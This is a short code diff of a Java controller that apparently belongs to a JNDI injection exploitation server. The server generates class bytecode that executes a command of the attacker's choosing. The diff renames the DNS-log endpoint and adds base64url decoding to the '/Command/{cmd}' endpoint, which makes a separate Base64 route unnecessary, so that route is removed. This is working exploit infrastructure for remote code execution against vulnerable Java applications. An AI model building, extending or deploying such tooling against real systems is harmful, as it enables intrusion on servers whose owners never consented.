@@ -33,7 +33,7 @@ public class BasicController implements Controller {
         return className;
     }
 
-    @JNDIMapping("/DnsLog/{url}")
+    @JNDIMapping("/DNSLog/{url}")
     public byte[] dnsLog(String url) throws Exception {
         System.out.println("[DnsLog] Url:" + url);
 
@@ -58,6 +58,7 @@ public class BasicController implements Controller {
 
     @JNDIMapping("/Command/{cmd}")
     public byte[] command(String cmd) throws Exception {
+        cmd = MiscUtil.tryBase64UrlDecode(cmd);
         System.out.println("[Command] Cmd: " + cmd);
 
         String className = MiscUtil.getRandStr(12);
@@ -73,12 +74,6 @@ public class BasicController implements Controller {
         constructor.setBody(body);
         clazz.addConstructor(constructor);
         return clazz.toBytecode();
-    }
-
-    @JNDIMapping("/Command/Base64/{cmd}")
-    public byte[] base64Command(String cmd) throws Exception {
-        cmd = new String(Base64.getUrlDecoder().decode(cmd));
-        return this.command(cmd);
     }
 
     @JNDIMapping("/FromCode/{code}")
